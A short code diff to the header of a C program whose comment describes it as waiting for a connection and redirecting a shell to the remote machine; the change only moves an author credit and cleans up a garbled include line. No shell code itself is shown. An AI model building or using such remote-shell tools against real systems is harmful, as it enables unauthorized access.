@@ -3,9 +3,10 @@
 	
 	This program waits for an entry connection and redirects a
 	shell to the remote machine
+	Author Javier Tejedor
 **/
 
-#include <unistd.h> uthor Javier Tejedor
+#include <unistd.h>
 #include <unistd.h> 
 #include <sys/socket.h>
 #include <netinet/in.h>
